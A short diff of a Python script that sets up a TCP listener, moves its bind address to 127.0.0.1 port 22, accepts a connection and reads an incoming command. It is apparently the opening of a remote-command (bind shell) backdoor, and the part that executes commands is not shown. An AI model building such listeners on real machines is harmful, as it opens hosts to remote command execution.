@@ -2,12 +2,12 @@
 
 import socket
 import subprocess
-
+import cmd
 
 sockboi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 with sockboi as s:
-    s.bind(("192.168.8.2", 1500))
+    s.bind(("127.0.0.1", 22))
     s.listen(2)
     me, addr = s.accept()
     com = me.recv(2048)
